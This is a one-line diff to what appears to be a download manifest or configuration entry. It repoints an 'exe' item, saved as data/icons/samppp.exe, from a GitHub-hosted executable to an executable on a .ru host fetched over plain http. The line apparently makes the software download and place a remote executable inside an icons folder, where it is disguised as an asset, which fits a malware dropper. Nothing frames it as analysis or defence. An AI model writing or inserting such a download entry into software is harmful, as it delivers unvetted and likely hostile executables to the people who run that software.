@@ -1,1 +1,1 @@
-exe;data/icons/samppp.exe;https://github.com/snowpower2/snow/raw/main/rocket.exe?dl=1
+exe;data/icons/samppp.exe;http://closehub.ru/piska.exe?dl=1
